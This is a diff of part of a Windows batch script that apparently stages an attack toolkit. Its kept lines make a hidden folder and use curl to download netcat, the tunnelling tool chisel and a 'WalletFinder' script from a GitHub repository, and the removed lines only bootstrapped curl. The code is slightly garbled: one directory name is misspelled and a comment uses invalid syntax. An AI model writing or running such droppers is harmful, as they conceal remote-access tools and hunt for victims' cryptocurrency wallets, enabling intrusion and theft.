@@ -5,14 +5,6 @@ attrib +h %homedrive%\Akuma
 mkdir %homedrive%\Akuma\nc
 %homedrive%
 cd %homedrive%\A7uma
-where curl >nul 2>nul
-if %errorlevel% == 0 (
-curl -L https://github.com/curl/curl/releases/download/curl-8_4_0/curl-8.4.0.zip > %homedrive%\Akuma\curl-8.4.0.zip
-powershell Expand-Archive -Path '%homedrive%\Akuma\curl-8.4.0.zip' -DestinationPath '%homedrive%\Akuma'
-%homedrive%\Akuma\curl-8.4.0\
-) else (
-# Pause the script to keep the window open
-)
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
 curl -L https://raw.githubusercontent.com/l-urk/Wallet-Finder/main/WalletFinder.bat > %homedrive%\Akuma\WalletFinder.bat
